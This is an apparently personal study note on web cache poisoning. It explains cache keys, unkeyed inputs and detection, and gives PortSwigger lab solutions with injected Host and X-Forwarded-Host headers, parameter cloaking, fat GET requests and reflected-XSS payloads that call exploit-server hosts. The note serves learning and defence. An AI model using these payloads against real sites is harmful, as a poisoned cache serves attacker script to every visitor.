

### How does it work 

if the server send a response to every HTTP request separately this would overload the server, the cache sits between the server and the user, where it saves the responses to particular requests  usually for a fixed amount. if another user then sends an equivalent request the cache simply sends a copy of the cached response directly to the user



Cache Key is a set of specific components from an HTTP request that the cache uses to identify and match requests. if a new incoming request has the same cache key as the previous request the cache considers the requests equivalent and serves the stored response for the original request :
- Request Line: Include the HTTP method GET POST 
- Host header: specifies the server's domain name 



### Impact 

- explicitly linked to how harmful the injected payload is 
- the poison will be served to users who visit the affected page while the cache is poisoned 


### Identify

- identify it manually by adding random inputs to requests and observing whether or not they have an effect on the response  we can use comparer if needed
- PARAM MINER  try on  guess headers 


One we identified an unkeyed input, the next step is to evaluate exactly how the website processes it . if an input is reflected in the response from the server  without being sanitized then its a potential point for web poisoning 


The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed

### Identify a suitable cache oracle

- an http header that explicitly tells you whether you got a cache hit
- observable change to dynamic content
-  Distinct response time 
-  if there is a specific cache party check for documentations 
- Akamai-based websites may support the header `Pragma: akamai-x-get-cache-key` you can display the cache keys by placing in the request 
- some caching systems will parse the header and exclude the port from the cache key 


### Detecting an unkeyed query 

- if it doesnt explicitly mention whether its a cache hit or not we can identify a dynamic page,  there are some ways to do so is by adding a cache buster in the Accept
- we can add the add static/dynamic cache buster header and include cache busters in header  in param miner 
- other approach is to see whether there is any discrepancies between the cache and back-end you can sometimes exploit this issue requests with different keys 
- Apache: `GET //   `Nginx: `GET /%2F   `PHP: `GET /index.php/xyz   `.NET `GET /(A(xyz)/`
- some websites only exclude specific query parameters that are not relevant to the back-end application, such as parameters for analytics or serving targeted advertisements. UTM parameters like `utm_content` are good candidates to check during testing. 

### Cache parameter cloaking

-  some websites treat `?` as a new param so we can do this `GET /?example=123?excluded_param=bad-stuff-here`

### Exploiting cache implementation flaws

Although `X-Forwarded-Host` is the de facto standard for this behavior, you may come across other headers that serve a similar purpose, including:

- `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`

####  PREVENTING

- if you are considering excluding something from the cache key for performance reasons, rewrite the request instead.
- Don't accept fat `GET` requests. Be aware that some third-party technologies may permit this by default.
- Patch client-side vulnerabilities even if they seem unexploitable.


Simple example:

```
GET /en?region=uk HTTP/1.1 Host: innocent-website.com X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK Cache-Control: public <meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />`
```
as we see in this request that x-for is being reflected so if we injected an XSS  and this request is cached then basically every user that visits this page will be injected with XSS





# LABS

#### Web cache poisoning with an unkeyed header

i noticed that in the page `/` if i added `X-Forwarded-Host: example` it gets reflected in the  response , i tried to do an xss noluck

so what we can do is that  add the header 
```

X-Forwarded-Host: exploit-0a2800b6047a4d3c801193a101990064.exploit-server.net/
```

 to the exploit server and serve a `alert(doc.cookie)` in the body 


#### Web cache poisoning with an unkeyed cookie

``` js
; fehost="-alert(1)}//
```

toggle the payload with a specifier like `/login?a=a` to be certain  then visit the page 



####  Web cache poisoning with multiple headers
```http
X-Forwarded-Scheme: HTTP
X-Forwarded-Host: exploit-0a390002037cb91b80a7395f017300dd.exploit-server.net
```
add these in the header then visit the app 

#### Double Host / Cache poisoning

```
Host: 0adf00cc033d5f09c05b077d000200eb.web-security-academy.net
Host: "></script><script>alert(document.cookie)</script>
```
#### Targeted web cache poisoning using an unknown header

-  check for leaking info in `Vary` header

i noticed that basically with param miner we get some secret header which is X-host and this header acted upon building a a full url in the response so we placed that X-host  in our expoit server and in the body we inserted a alert()

i noticed that the response cotains vary header user agent The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed

meaning it can be used as cache distinguisher  pace this the expoit server in the post as `<img src="...">` and check  the logs copy the victims user agent and we are done 



#### Web cache poisoning via an unkeyed query string

origin header is basiaclly the cache buster 

we noticed when we placed a query string its reflected hence we can do is that reflected xss 

```js
`/?a='/><script>alert(1)</script> `

```


#### Web cache poisoning via an unkeyed query parameter

the application accepts utm_content  which is a utacking module  basically the value is reflected in it

```javascript

GET /?utm_content='/><script>alert(1)</script
```


#### Parameter cloaking

``` HTTP
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) 
```


or we can basically rewrite callback 



#### Web cache poisoning via a fat GET request


`GET /?param=innocent HTTP/1.1 … param=bad-stuff-here`

if this didn't work try adding ``X-HTTP-Method-Override: POST`` 


``` http 
GET /js/geolocate.js?callback=setCountryCookie
callback=alert(1) 
```


#### URL normalization

anything we write in the  home page result in not found and the value is reflected  

``` HTTP 
GET /a</p><script>alert(1)</script> 
```



#### Web cache poisoning via ambiguous requests

Add a host header `Host: exploit-0a8c007803a6cd7a8075f81f01b700ce.exploit-server.net` to the exploit server and in the body insert an alert(cookie.document)
# References

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
